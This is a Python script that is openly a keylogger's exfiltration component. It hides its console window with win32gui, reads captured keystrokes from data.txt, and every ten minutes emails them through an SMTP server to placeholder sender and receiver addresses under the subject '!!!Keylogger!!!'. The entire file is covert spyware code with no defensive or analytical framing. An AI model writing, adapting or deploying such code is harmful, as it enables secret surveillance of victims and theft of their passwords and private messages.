import smtplib
import time
import win32console
import win32gui



def hide():
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True


def sending():
    with open("data.txt", "r") as da:
        lines = da.read().split(",")

    for line in lines:
        text_logs = line

    while True:
        time.sleep(600)
        user = "username"
        pwd = "password"
        mail_text = text_logs
        subject = "!!!Keylogger!!!"

        MAIL_FROM = "sender"
        RCPT_TO = "receiver"
        DATA = 'From:%s\nTo:%s\nSubject:%s\n\n%s' % (MAIL_FROM, RCPT_TO, subject, mail_text)

        server = smtplib.SMTP('smtp.server.com:port')
        server.starttls()
        server.login(user, pwd)
        server.sendmail(MAIL_FROM, RCPT_TO, DATA)
        server.quit()


hide()
sending()
